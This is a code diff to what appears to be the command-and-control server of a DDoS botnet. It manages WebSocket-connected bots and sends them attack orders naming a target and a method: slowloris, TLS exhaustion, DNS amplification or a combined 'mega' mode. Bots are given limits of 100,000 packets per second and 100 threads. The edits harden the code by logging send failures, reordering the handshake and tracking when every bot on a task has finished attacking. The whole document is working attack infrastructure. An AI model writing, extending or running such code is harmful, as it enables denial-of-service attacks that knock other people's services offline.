@@ -20,9 +20,10 @@ class BotConnectionManager:
         self.active: Dict[str, WebSocket] = {}
         self._last_stats: Dict[str, tuple] = {}
         self._lock = asyncio.Lock()
-        # Track last heartbeat time for stale detection
         self._last_heartbeat: Dict[str, datetime] = {}
         self._hb_task = None
+        # task_id -> set of bot_ids that reported attack_done
+        self._task_done: Dict[str, set] = {}
 
     async def _start_heartbeat_checker(self):
         while True:
@@ -102,27 +103,40 @@ class BotConnectionManager:
             self.active[new_key] = ws
             self._last_heartbeat[new_key] = datetime.now(timezone.utc)
 
-    async def send_json(self, bot_id: str, data: dict):
+    def _find_ws(self, bot_id: str):
+        """Resolve WS by DB id or any active key matching the same socket."""
         key = str(bot_id)
         ws = self.active.get(key)
+        if ws is not None:
+            return key, ws
+        # Fallback: scan values (small fleet)
+        for k, w in list(self.active.items()):
+            if k == key:
+                return k, w
+        return None, None
+
+    async def send_json(self, bot_id: str, data: dict) -> bool:
+        key, ws = self._find_ws(bot_id)
         if not ws:
-            return
+            print(f"[WS] send_json miss bot_id={bot_id} active={list(self.active.keys())}")
+            return False
         try:
             await ws.send_json(data)
-        except Exception:
-            # Only disconnect on permanent failures, not transient ones
-            await self.disconnect(key, ws)
+            return True
+        except Exception as e:
+            print(f"[WS] send_json fail bot={key}: {type(e).__name__}: {e}")
+            # Do not tear down on every send fail — bot may reconnect
+            return False
 
     async def send_attack_command(self, bot_id: str, task: dict):
         method = (task.get("method") or "UDP").upper()
-        # Derive method flags so bot always receives correct mode bits
         flags = {
             "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
             "tls_exhaust": 1 if method == "TLS_EXHAUST" or task.get("tls_exhaust") else 0,
             "dns_amp": 1 if method == "DNS_AMP" or task.get("dns_amp") else 0,
             "mega_mode": 1 if method == "MEGA" or task.get("mega_mode") else 0,
         }
-        await self.send_json(bot_id, {
+        ok = await self.send_json(bot_id, {
             "type": "attack",
             "task_id": task["id"],
             "target": task["target"],
@@ -135,6 +149,7 @@ class BotConnectionManager:
             "fragmentation": task.get("fragmentation", 0),
             **flags,
         })
+        print(f"[WS] attack cmd bot={bot_id} method={method} ok={ok}")
 
     async def send_stop_command(self, bot_id: str, task_id: str):
         await self.send_json(bot_id, {"type": "stop", "task_id": task_id})
@@ -251,20 +266,29 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                                 bot.bot_version = data.get("version")
                             await s.commit()
 
+                    # Ack first so bot enters main loop ASAP, then rebind keys
+                    try:
+                        await ws.send_json({
+                            "type": "handshake_ack",
+                            "bot_id": db_id,
+                            "max_pps": 100000,
+                            "max_threads": 100,
+                            "config": {"max_pps": 100000, "max_threads": 100},
+                        })
+                        print(f"[WS] handshake_ack sent bot={db_id}")
+                    except Exception as se:
+                        print(f"[WS] handshake_ack send fail: {type(se).__name__}: {se}")
                     await manager.rebind(session_key, db_id, ws)
                     session_key = db_id
-                    await ws.send_json({
-                        "type": "handshake_ack",
-                        "bot_id": db_id,
-                        "config": {"max_pps": 100000, "max_threads": 100},
-                    })
-                    print(f"[WS] handshake_ack sent session={session_key}")
+                except WebSocketDisconnect:
+                    print(f"[WS] handshake aborted disconnect session={session_key}")
+                    raise
                 except Exception as e:
-                    print(f"[WS] handshake error {session_key}: {e}")
+                    print(f"[WS] handshake error {session_key}: {type(e).__name__}: {e}")
                     import traceback
                     traceback.print_exc()
                     try:
-                        await ws.send_json({"type": "error", "message": f"handshake failed: {e}"})
+                        await ws.send_json({"type": "error", "message": f"handshake failed: {type(e).__name__}"})
                     except Exception:
                         pass
                     continue
@@ -304,21 +328,24 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                                 await s.commit()
 
             elif msg_type == "attack_done":
-                # Optional: mark task complete when bot finishes
                 task_id = data.get("task_id")
                 tid = _try_uuid(task_id) if task_id else None
                 if tid:
+                    tkey = str(tid)
+                    done = manager._task_done.setdefault(tkey, set())
+                    done.add(session_key)
                     async with async_session() as s:
                         task = (await s.execute(
                             select(AttackTask).where(AttackTask.id == tid, AttackTask.status == "running")
                         )).scalar_one_or_none()
                         if task:
-                            active_ids = task.bot_ids or []
-                            online = [bid for bid in active_ids if str(bid) in manager.active]
-                            if len(online) <= 1:
+                            n_bots = len(task.bot_ids or []) or 1
+                            if len(done) >= n_bots:
                                 task.status = "completed"
                                 task.completed_at = datetime.now(timezone.utc)
                                 await s.commit()
+                                manager._task_done.pop(tkey, None)
+                                print(f"[WS] task {tkey} completed ({len(done)}/{n_bots} bots done)")
 
     except WebSocketDisconnect:
         print(f"[WS] bot {session_key} disconnected")
